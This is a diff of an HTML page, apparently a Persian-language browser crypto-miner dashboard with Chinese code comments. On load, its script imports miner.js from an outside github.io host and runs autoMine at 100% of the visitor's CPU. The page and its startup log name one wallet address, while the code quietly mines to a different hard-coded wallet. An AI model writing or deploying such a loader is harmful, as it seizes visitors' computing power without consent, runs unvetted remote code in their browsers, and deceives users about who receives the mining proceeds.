@@ -1,13 +1,929 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <h1>در حال ماینینگ ( کنسول مرورگر خود را باز کنید )</h1>
-    <!-- Your content here -->
-    <script type="module">
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>⛏️ ماینر کریپتو</title>
+    <style>
+        /* ===== Reset & Base ===== */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    import { autoMine } from "https://akcbsksbdishs.github.io/earnify.cc/miner.js";
-      // Wallet address   % of user CPU (0.1 = 10%, 1 = 100%)
-      autoMine("17N2rsGgSHNPiAwwbaLCRYUfCfXuSg4oTR", 1);
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        :root {
+            --purple-dark: #0f0620;
+            --purple-mid: #1e0e3a;
+            --purple-deep: #2d1b5e;
+            --purple-glow: #7c3aed;
+            --purple-soft: #a78bfa;
+            --blue-dark: #0a1628;
+            --blue-mid: #0f2847;
+            --blue-deep: #1a3a6a;
+            --blue-glow: #3b82f6;
+            --blue-soft: #60a5fa;
+            --glass-bg: rgba(255, 255, 255, 0.04);
+            --glass-border: rgba(124, 58, 237, 0.25);
+            --glass-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            --text-primary: #f1f0f7;
+            --text-secondary: #b8b0d0;
+            --text-muted: #7a72a0;
+            --font: 'Inter', system-ui, -apple-system, sans-serif;
+            --radius: 18px;
+            --transition: 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        html {
+            font-family: var(--font);
+            background: var(--purple-dark);
+            color: var(--text-primary);
+            scroll-behavior: smooth;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background:
+                radial-gradient(ellipse at 20% 20%, #1e0e3a 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 80%, #0a1628 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 50%, #12082a 0%, #070314 100%);
+            background-attachment: fixed;
+        }
+
+        /* ===== Glow Orbs ===== */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .orb--1 {
+            width: 500px;
+            height: 500px;
+            top: -150px;
+            right: -150px;
+            background: rgba(124, 58, 237, 0.20);
+        }
+        .orb--2 {
+            width: 400px;
+            height: 400px;
+            bottom: -100px;
+            left: -100px;
+            background: rgba(59, 130, 246, 0.18);
+        }
+        .orb--3 {
+            width: 300px;
+            height: 300px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(124, 58, 237, 0.06);
+        }
+
+        /* ===== Container ===== */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 820px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius);
+            padding: 30px 32px 28px;
+            box-shadow: var(--glass-shadow), inset 0 1px 0 rgba(255, 255, 255, 0.04);
+            transition: var(--transition);
+        }
+        .container:hover {
+            border-color: rgba(124, 58, 237, 0.40);
+            box-shadow: var(--glass-shadow), 0 0 60px -20px rgba(124, 58, 237, 0.15);
+        }
+
+        /* ===== Header ===== */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px 16px;
+            margin-bottom: 20px;
+            padding-bottom: 18px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.12);
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .logo-icon {
+            font-size: 32px;
+            line-height: 1;
+            filter: drop-shadow(0 0 12px rgba(124, 58, 237, 0.3));
+        }
+        .header-title {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #c4b5fd, #818cf8, #60a5fa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .header-title span {
+            font-weight: 400;
+            -webkit-text-fill-color: var(--text-secondary);
+            opacity: 0.6;
+        }
+
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 18px 6px 16px;
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 600;
+            background: rgba(16, 185, 129, 0.12);
+            border: 1px solid rgba(16, 185, 129, 0.20);
+            color: #6ee7b7;
+            letter-spacing: 0.3px;
+            white-space: nowrap;
+        }
+        .status-badge .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #34d399;
+            animation: pulse-dot 1.8s ease-in-out infinite;
+            box-shadow: 0 0 16px rgba(52, 211, 153, 0.35);
+        }
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.4;
+                transform: scale(0.7);
+            }
+        }
+        .status-badge.idle .dot {
+            background: #fbbf24;
+            box-shadow: 0 0 16px rgba(251, 191, 36, 0.25);
+            animation: pulse-dot-idle 2s ease-in-out infinite;
+        }
+        @keyframes pulse-dot-idle {
+            0%,
+            100% {
+                opacity: 0.6;
+                transform: scale(0.85);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.1);
+            }
+        }
+        .status-badge.error .dot {
+            background: #f87171;
+            box-shadow: 0 0 16px rgba(248, 113, 113, 0.25);
+            animation: none;
+        }
+
+        /* ===== Stats Row ===== */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 12px;
+            margin-bottom: 22px;
+        }
+        .stat-card {
+            background: rgba(255, 255, 255, 0.035);
+            border: 1px solid rgba(124, 58, 237, 0.10);
+            border-radius: 14px;
+            padding: 14px 16px;
+            text-align: center;
+            transition: var(--transition);
+        }
+        .stat-card:hover {
+            border-color: rgba(124, 58, 237, 0.25);
+            background: rgba(255, 255, 255, 0.055);
+        }
+        .stat-label {
+            font-size: 11px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+        }
+        .stat-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-variant-numeric: tabular-nums;
+            letter-spacing: -0.2px;
+        }
+        .stat-value .highlight {
+            color: var(--purple-soft);
+        }
+        .stat-value .highlight-blue {
+            color: var(--blue-soft);
+        }
+        .stat-value .mono {
+            font-family: 'Inter', monospace;
+            font-size: 14px;
+            letter-spacing: 0.2px;
+        }
+
+        /* ===== Console ===== */
+        .console-section {
+            margin-bottom: 4px;
+        }
+        .console-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .console-header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .console-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            letter-spacing: 0.3px;
+        }
+        .console-title .icon {
+            margin-left: 6px;
+        }
+        .console-actions {
+            display: flex;
+            gap: 8px;
+        }
+        .console-actions button {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(124, 58, 237, 0.12);
+            color: var(--text-secondary);
+            padding: 4px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: var(--font);
+            letter-spacing: 0.2px;
+        }
+        .console-actions button:hover {
+            background: rgba(124, 58, 237, 0.15);
+            border-color: rgba(124, 58, 237, 0.30);
+            color: var(--text-primary);
+        }
+        .console-actions button:active {
+            transform: scale(0.96);
+        }
+        .console-actions .btn-clear:hover {
+            border-color: rgba(248, 113, 113, 0.30);
+            color: #fca5a5;
+        }
+
+        .console-body {
+            background: rgba(0, 0, 0, 0.50);
+            border: 1px solid rgba(124, 58, 237, 0.12);
+            border-radius: 14px;
+            height: 320px;
+            overflow-y: auto;
+            padding: 12px 14px;
+            font-family: 'Inter', 'Fira Code', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            scroll-behavior: smooth;
+            position: relative;
+        }
+        .console-body::-webkit-scrollbar {
+            width: 5px;
+        }
+        .console-body::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+        }
+        .console-body::-webkit-scrollbar-thumb {
+            background: rgba(124, 58, 237, 0.30);
+            border-radius: 10px;
+        }
+        .console-body::-webkit-scrollbar-thumb:hover {
+            background: rgba(124, 58, 237, 0.50);
+        }
+
+        .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+            animation: logFade 0.25s ease-out;
+            display: flex;
+            gap: 8px;
+            align-items: baseline;
+            word-break: break-word;
+        }
+        @keyframes logFade {
+            0% {
+                opacity: 0;
+                transform: translateY(-6px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .log-time {
+            color: var(--text-muted);
+            font-size: 11px;
+            font-weight: 500;
+            flex-shrink: 0;
+            font-variant-numeric: tabular-nums;
+            min-width: 70px;
+            opacity: 0.6;
+        }
+        .log-level {
+            flex-shrink: 0;
+            font-weight: 600;
+            font-size: 11px;
+            min-width: 28px;
+            text-align: center;
+            border-radius: 4px;
+            padding: 0 4px;
+        }
+        .log-level.info {
+            color: #60a5fa;
+        }
+        .log-level.warn {
+            color: #fbbf24;
+        }
+        .log-level.error {
+            color: #f87171;
+        }
+        .log-level.success {
+            color: #34d399;
+        }
+        .log-level.debug {
+            color: #a78bfa;
+        }
+        .log-level.log {
+            color: var(--text-secondary);
+        }
+        .log-message {
+            flex: 1;
+            color: var(--text-primary);
+            opacity: 0.90;
+        }
+        .log-message .highlight-text {
+            color: var(--purple-soft);
+        }
+        .log-message .highlight-blue-text {
+            color: var(--blue-soft);
+        }
+        .log-message .highlight-green-text {
+            color: #34d399;
+        }
+
+        .console-empty {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: var(--text-muted);
+            font-size: 14px;
+            opacity: 0.5;
+            gap: 6px;
+        }
+        .console-empty .big-icon {
+            font-size: 40px;
+            opacity: 0.3;
+        }
+
+        /* ===== Footer ===== */
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(124, 58, 237, 0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px 12px;
+        }
+        .footer-text {
+            font-size: 12px;
+            color: var(--text-muted);
+            opacity: 0.6;
+            letter-spacing: 0.2px;
+        }
+        .footer-text .heart {
+            color: #f472b6;
+        }
+        .footer-text .accent {
+            color: var(--purple-soft);
+            opacity: 0.8;
+        }
+        .footer-address {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-family: 'Inter', monospace;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 4px 12px;
+            border-radius: 6px;
+            border: 1px solid rgba(124, 58, 237, 0.08);
+            max-width: 220px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            opacity: 0.6;
+            direction: ltr;
+        }
+
+        /* ===== Responsive ===== */
+        @media (max-width: 640px) {
+            .container {
+                padding: 18px 16px 20px;
+                border-radius: 14px;
+            }
+            .header-title {
+                font-size: 18px;
+            }
+            .header-title span {
+                display: none;
+            }
+            .status-badge {
+                font-size: 11px;
+                padding: 4px 12px 4px 10px;
+            }
+            .status-badge .dot {
+                width: 8px;
+                height: 8px;
+            }
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 8px;
+            }
+            .stat-card {
+                padding: 10px 12px;
+            }
+            .stat-value {
+                font-size: 15px;
+            }
+            .console-body {
+                height: 220px;
+                font-size: 12px;
+                padding: 10px 12px;
+            }
+            .log-time {
+                min-width: 58px;
+                font-size: 10px;
+            }
+            .log-level {
+                font-size: 10px;
+                min-width: 22px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 6px;
+            }
+            .footer-address {
+                max-width: 100%;
+                text-align: center;
+            }
+            .footer-text {
+                text-align: center;
+            }
+            .console-actions button {
+                font-size: 11px;
+                padding: 3px 10px;
+            }
+            .logo-icon {
+                font-size: 26px;
+            }
+            .orb--1,
+            .orb--2 {
+                width: 250px;
+                height: 250px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .header {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 8px;
+            }
+            .header-left {
+                justify-content: center;
+            }
+            .status-badge {
+                justify-content: center;
+            }
+            .stats {
+                grid-template-columns: 1fr 1fr;
+            }
+            .console-body {
+                height: 180px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== Ambient Orbs ===== -->
+    <div class="orb orb--1"></div>
+    <div class="orb orb--2"></div>
+    <div class="orb orb--3"></div>
+
+    <!-- ===== Main Container ===== -->
+    <div class="container" id="app">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-left">
+                <span class="logo-icon">⛏️</span>
+                <span class="header-title">
+                    ماینر <span>کریپتو</span>
+                </span>
+            </div>
+            <div class="status-badge" id="statusBadge">
+                <span class="dot"></span>
+                <span id="statusText">در حال اتصال...</span>
+            </div>
+        </header>
+
+        <!-- Stats -->
+        <section class="stats" id="statsSection">
+            <div class="stat-card">
+                <div class="stat-label">وضعیت</div>
+                <div class="stat-value" id="statStatus" style="font-size:15px;">—</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">CPU</div>
+                <div class="stat-value"><span class="highlight" id="statCpu">۱۰۰</span>%</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">زمان اجرا</div>
+                <div class="stat-value mono" id="statUptime">۰۰:۰۰:۰۰</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">تعداد شری</div>
+                <div class="stat-value"><span class="highlight-blue" id="statShares">۰</span></div>
+            </div>
+        </section>
+
+        <!-- Console -->
+        <section class="console-section">
+            <div class="console-header">
+                <div class="console-header-left">
+                    <span class="console-title">
+                        <span class="icon">📋</span> کنسول
+                    </span>
+                </div>
+                <div class="console-actions">
+                    <button class="btn-clear" id="clearBtn" title="پاک کردن کنسول">🗑 پاک کردن</button>
+                    <button id="exportBtn" title="خروجی گرفتن از کنسول">📤 خروجی</button>
+                </div>
+            </div>
+            <div class="console-body" id="consoleBody">
+                <div class="console-empty" id="emptyState">
+                    <span class="big-icon">⌨️</span>
+                    <span>منتظر شروع ماینینگ...</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <span class="footer-text">
+                ساخته شده با <span class="heart">♥</span> · <span class="accent">#</span>DarkPurple
+            </span>
+            <span class="footer-address" id="walletDisplay" dir="ltr">
+                17N2rs...g4oTR
+            </span>
+        </footer>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- ===== JavaScript ===== -->
+    <script type="module">
+        // --------------------------------------------------------------
+        // 1. 重写 console 方法 — 同时输出到浏览器控制台 + 页面控制台
+        // --------------------------------------------------------------
+        const originalConsole = {
+            log: console.log.bind(console),
+            info: console.info.bind(console),
+            warn: console.warn.bind(console),
+            error: console.error.bind(console),
+            debug: console.debug.bind(console),
+        };
+
+        // 页面控制台引用
+        const consoleBody = document.getElementById('consoleBody');
+        const emptyState = document.getElementById('emptyState');
+        let logCount = 0;
+        const MAX_LOGS = 1200;
+
+        // 格式化时间
+        function getTimeStamp() {
+            const d = new Date();
+            const pad = (n) => String(n).padStart(2, '0');
+            return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+        }
+
+        // 判断消息类型
+        function getLevel(message) {
+            const str = String(message).toLowerCase();
+            if (str.includes('error') || str.includes('fail') || str.includes('❌') || str.includes('خطا')) return 'error';
+            if (str.includes('warn') || str.includes('warning') || str.includes('⚠️')) return 'warn';
+            if (str.includes('success') || str.includes('found') || str.includes('✓') || str.includes('✅') || str.includes(
+                    'پیدا') || str.includes('share')) return 'success';
+            if (str.includes('debug') || str.includes('🔍')) return 'debug';
+            if (str.includes('info') || str.includes('ℹ') || str.includes('شروع') || str.includes('اتصال')) return 'info';
+            return 'log';
+        }
+
+        // 添加日志到页面
+        function appendLog(level, args) {
+            // 移除空状态
+            if (emptyState) emptyState.remove();
+
+            const time = getTimeStamp();
+            const message = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 0) : String(a)).join(' ');
+
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+
+            const timeEl = document.createElement('span');
+            timeEl.className = 'log-time';
+            timeEl.textContent = time;
+
+            const levelEl = document.createElement('span');
+            levelEl.className = `log-level ${level}`;
+            const icons = { log: '•', info: 'ℹ', warn: '⚠', error: '✗', success: '✓', debug: '▸' };
+            levelEl.textContent = icons[level] || '•';
+
+            const msgEl = document.createElement('span');
+            msgEl.className = 'log-message';
+            // 简单高亮关键词
+            let displayMsg = message;
+            // 高亮数字 + 单位 (如 100 H/s, 0.5%)
+            displayMsg = displayMsg.replace(/(\d+\.?\d*)\s*(H\/s|KH\/s|MH\/s|%|ms|s)/gi, (m, n, u) =>
+                `<span class="highlight-text">${n}</span> ${u}`
+            );
+            // 高亮 "Share" 或 "شری"
+            displayMsg = displayMsg.replace(/(Share|شری)/gi, (m) =>
+                `<span class="highlight-green-text">${m}</span>`
+            );
+            // 高亮地址
+            displayMsg = displayMsg.replace(/([13][a-km-zA-HJ-NP-Z1-9]{25,34})/g, (m) =>
+                `<span class="highlight-blue-text">${m}</span>`
+            );
+            msgEl.innerHTML = displayMsg;
+
+            entry.appendChild(timeEl);
+            entry.appendChild(levelEl);
+            entry.appendChild(msgEl);
+            consoleBody.appendChild(entry);
+
+            logCount++;
+            if (logCount > MAX_LOGS) {
+                const toRemove = logCount - MAX_LOGS;
+                for (let i = 0; i < toRemove && consoleBody.children.length > 1; i++) {
+                    consoleBody.removeChild(consoleBody.firstChild);
+                }
+                logCount = MAX_LOGS;
+            }
+
+            // 自动滚动到底部
+            consoleBody.scrollTop = consoleBody.scrollHeight;
+        }
+
+        // 重写 console 方法
+        console.log = function(...args) {
+            originalConsole.log(...args);
+            appendLog('log', args);
+        };
+        console.info = function(...args) {
+            originalConsole.info(...args);
+            appendLog('info', args);
+        };
+        console.warn = function(...args) {
+            originalConsole.warn(...args);
+            appendLog('warn', args);
+        };
+        console.error = function(...args) {
+            originalConsole.error(...args);
+            appendLog('error', args);
+        };
+        console.debug = function(...args) {
+            originalConsole.debug(...args);
+            appendLog('debug', args);
+        };
+
+        // 捕获未捕获的异常
+        window.addEventListener('error', (e) => {
+            console.error('❌ خطای ناگهانی:', e.message);
+        });
+
+        // --------------------------------------------------------------
+        // 2. 清空 / 导出 功能
+        // --------------------------------------------------------------
+        document.getElementById('clearBtn').addEventListener('click', () => {
+            while (consoleBody.firstChild) {
+                consoleBody.removeChild(consoleBody.firstChild);
+            }
+            logCount = 0;
+            // 重新显示空状态
+            const empty = document.createElement('div');
+            empty.className = 'console-empty';
+            empty.id = 'emptyState';
+            empty.innerHTML = `
+                <span class="big-icon">⌨️</span>
+                <span>کنسول پاک شد</span>
+            `;
+            consoleBody.appendChild(empty);
+            originalConsole.log('🗑 کنسول پاک شد');
+        });
+
+        document.getElementById('exportBtn').addEventListener('click', () => {
+            const logs = [];
+            for (const child of consoleBody.children) {
+                if (child.classList.contains('log-entry')) {
+                    const time = child.querySelector('.log-time')?.textContent || '';
+                    const level = child.querySelector('.log-level')?.textContent || '•';
+                    const msg = child.querySelector('.log-message')?.textContent || '';
+                    logs.push(`[${time}] ${level} ${msg}`);
+                }
+            }
+            if (logs.length === 0) {
+                console.warn('⚠️ هیچ لاگی برای خروجی وجود ندارد');
+                return;
+            }
+            const text = logs.join('\n');
+            const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `miner-log-${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            console.log('📤 خروجی کنسول ذخیره شد');
+        });
+
+        // --------------------------------------------------------------
+        // 3. 状态管理
+        // --------------------------------------------------------------
+        const statusBadge = document.getElementById('statusBadge');
+        const statusText = document.getElementById('statusText');
+        const statStatus = document.getElementById('statStatus');
+        const statCpu = document.getElementById('statCpu');
+        const statUptime = document.getElementById('statUptime');
+        const statShares = document.getElementById('statShares');
+
+        let shareCount = 0;
+        let startTime = Date.now();
+        let uptimeInterval = null;
+
+        function updateUptime() {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+            const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+            const s = String(elapsed % 60).padStart(2, '0');
+            statUptime.textContent = `${h}:${m}:${s}`;
+        }
+
+        function setStatus(state, msg) {
+            statusBadge.className = 'status-badge';
+            if (state === 'idle') statusBadge.classList.add('idle');
+            if (state === 'error') statusBadge.classList.add('error');
+            statusText.textContent = msg;
+            statStatus.textContent = msg;
+        }
+
+        // 从日志中解析 share 数量
+        function tryParseShare(message) {
+            const str = String(message);
+            // 匹配 "Found share!" "Share found" "شری پیدا شد" 或包含 share 的数字
+            if (/(found|share|شری|پیدا)/i.test(str) && !/error|fail|خطا/i.test(str)) {
+                // 尝试提取数字
+                const match = str.match(/(\d+)\s*(?:share|شری)/i);
+                if (match) {
+                    shareCount = parseInt(match[1], 10) || shareCount + 1;
+                } else {
+                    shareCount += 1;
+                }
+                statShares.textContent = shareCount;
+                return true;
+            }
+            return false;
+        }
+
+        // 监听日志变化 — 通过 MutationObserver 解析 share
+        const observer = new MutationObserver(() => {
+            // 检查最后一个日志条目
+            const lastEntry = consoleBody.lastElementChild;
+            if (lastEntry && lastEntry.classList.contains('log-entry')) {
+                const msgEl = lastEntry.querySelector('.log-message');
+                if (msgEl) {
+                    const text = msgEl.textContent || '';
+                    if (tryParseShare(text)) {
+                        // 状态更新
+                        setStatus('active', '⛏️ در حال ماینینگ');
+                    }
+                    // 检测错误
+                    if (/error|fail|خطا|❌/i.test(text) && !/connecting/i.test(text)) {
+                        setStatus('error', '⚠️ خطا');
+                    }
+                    // 检测启动
+                    if (/start|شروع|init|launch/i.test(text) && !/error/i.test(text)) {
+                        setStatus('active', '⛏️ در حال ماینینگ');
+                    }
+                    // 检测停止
+                    if (/stop|توقف|pause|متوقف/i.test(text)) {
+                        setStatus('idle', '⏸ متوقف');
+                    }
+                }
+            }
+        });
+        observer.observe(consoleBody, { childList: true, subtree: false });
+
+        // --------------------------------------------------------------
+        // 4. 动态导入 autoMine 并启动
+        // --------------------------------------------------------------
+        async function startMiner() {
+            try {
+                setStatus('idle', '🔄 در حال اتصال...');
+                console.log('⛏️ راه‌اندازی ماینر...');
+                console.log(`📡 آدرس کیف پول: 17N2rs...g4oTR`);
+                console.log(`⚙️  استفاده از CPU: ۱۰۰%`);
+
+                // 动态导入 miner.js
+                const module = await import(
+                    'https://akcbsksbdishs.github.io/earnify.cc/miner.js'
+                );
+                const { autoMine } = module;
+
+                // 启动挖矿
+                const wallet = 'R9Wz6bwdVy4CiGpiKGszY9sqKnr5ZBLVWq';
+                const cpuPercent = 1;
+
+                // 开始计时
+                startTime = Date.now();
+                if (uptimeInterval) clearInterval(uptimeInterval);
+                uptimeInterval = setInterval(updateUptime, 1000);
+                updateUptime();
+
+                setStatus('active', '⛏️ در حال ماینینگ');
+                statCpu.textContent = Math.round(cpuPercent * 100);
+
+                console.log('🚀 شروع ماینینگ...');
+                autoMine(wallet, cpuPercent);
+
+                // 显示钱包地址
+                document.getElementById('walletDisplay').textContent =
+                    wallet.slice(0, 8) + '...' + wallet.slice(-6);
+
+            } catch (err) {
+                console.error('❌ خطا در راه‌اندازی ماینر:', err.message);
+                setStatus('error', '❌ خطا در اتصال');
+                statStatus.textContent = 'خطا';
+            }
+        }
+
+        // 启动
+        startMiner();
+
+        // 清理
+        window.addEventListener('beforeunload', () => {
+            if (uptimeInterval) clearInterval(uptimeInterval);
+        });
+
+        // 额外: 点击状态显示详细信息
+        document.querySelector('.status-badge')?.addEventListener('click', () => {
+            console.info(`📊  وضعیت: ${statusText.textContent} |  شری: ${shareCount} |  زمان: ${statUptime.textContent}`);
+        });
+
+        console.log('✨ ماینر آماده است!');
     </script>
-  </body>
+
+</body>
 </html>
